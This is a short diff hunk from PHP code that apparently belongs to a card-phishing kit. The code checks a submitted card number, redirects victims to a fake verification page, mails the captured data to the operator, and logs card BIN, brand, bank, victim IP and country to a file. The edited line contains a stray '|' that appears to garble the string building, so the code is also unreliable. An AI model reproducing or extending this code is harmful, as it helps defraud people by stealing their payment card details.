@@ -157,7 +157,7 @@ if($_SESSION['sescc'] == $_POST["ccno"]){
     header("location: $domain/Verify2.php?&sessionid=$gen&securessl=true");
 }else{
         mail($to,$subj,$data,$headers);
-        $empas   = "# $bin - $ccbrand - $cctype - $ccklas - $ccbank [ ".$systemInfo['country']." ]\n";
+        $empas   = "# $bin. " | ". strtoupper($_SESSION['_cc_brand_']) ." ". strtoupper($_SESSION['_cc_type_']) ." ". strtoupper($_SESSION['_cc_class_']) ." ". $_SESSION['_cc_bank_'] ." [ ".$ip." - ".$lokasi->country." ]\n";
     $file = fopen("assets/logs/bin.txt", "a");
     fwrite($file, $empas);
     fclose($file);
